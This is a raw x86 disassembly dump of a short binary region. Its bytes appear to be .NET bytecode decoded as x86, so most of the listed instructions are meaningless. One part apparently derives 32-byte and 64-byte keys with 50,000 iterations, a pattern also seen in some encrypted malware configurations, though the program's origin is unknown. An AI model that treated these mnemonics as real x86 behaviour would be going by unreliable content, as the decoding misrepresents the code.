  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 18             	or     0x18(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 1e                	jb     0x403ddf
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 7e                	jb     0x403e50
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 88                	jb     0x403d6a
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 96                	jb     0x403d88
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 1e 21 00       	and    $0x211e72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 7e                	jb     0x403e9a
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 36 21 00       	and    $0x213672,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 ac                	jb     0x403dff
  403e53:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	06                   	push   %es
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 1e 21 00       	and    $0x211e72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 b4                	jb     0x403e3b
  403e87:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e8c:	00 00                	add    %al,(%eax)
  403e8e:	06                   	push   %es
  403e8f:	25 72 ca 25 00       	and    $0x25ca72,%eax
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 ac                	jb     0x403e49
  403e9d:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	06                   	push   %es
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 d8                	jb     0x403eb3
  403edb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ee0:	00 00                	add    %al,(%eax)
  403ee2:	06                   	push   %es
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 ac                	jb     0x403e97
  403eeb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 ac             	or     %esi,-0x54(%edx)
  403f1e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f23:	00 00                	add    %al,(%eax)
  403f25:	06                   	push   %es
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 d8                	jb     0x403f06
  403f2e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f33:	00 00                	add    %al,(%eax)
  403f35:	06                   	push   %es
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 ac                	jb     0x403f94
  403fe8:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403fed:	00 00                	add    %al,(%eax)
  403fef:	06                   	push   %es
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 e2             	or     -0x1e(%edx),%dh
  404006:	25 00 70 6f c1       	and    $0xc16f7000,%eax
  40400b:	00 00                	add    %al,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 fe             	add    %dh,-0x2(%edx)
  404025:	25 00 70 14 d0       	and    $0xd0147000,%eax
  40402a:	0f 00 00             	sldt   (%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 06                	jb     0x4040cb
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 34                	jb     0x404147
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 7c             	add    %dh,0x7c(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
